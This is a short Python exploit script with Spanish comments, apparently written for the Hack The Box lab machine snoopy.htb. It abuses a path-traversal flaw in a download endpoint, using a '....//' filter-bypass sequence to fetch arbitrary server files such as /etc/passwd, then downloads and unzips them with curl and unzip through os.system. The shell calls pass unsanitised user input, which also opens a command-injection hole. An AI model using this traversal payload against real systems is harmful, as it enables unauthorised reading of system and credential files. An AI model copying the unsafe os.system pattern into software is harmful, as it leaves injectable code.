import os

def main():
    url_base = "http://snoopy.htb/download?file=....//....//....//....//..../"
    ruta = input("Ingrese la ruta dentro del archivo ZIP (por ejemplo, /etc/passwd): ")

    # Combinar la URL base con la ruta especificada
    url_completa = url_base + ruta

    # Descargar el archivo desde la URL completa
    comando_curl = f'curl -o {ruta}.zip "{url_completa}"'
    os.system(comando_curl)

    # Realizar la extracción (unzip) del archivo
    os.system(f'unzip {ruta}.zip')

    # Eliminar el archivo ZIP después de la extracción
    os.remove(f'{ruta}.zip')

    print(f"Archivo descargado y descomprimido como '{ruta}.zip' en el directorio actual. El archivo ZIP ha sido eliminado.")

if __name__ == "__main__":
    main()
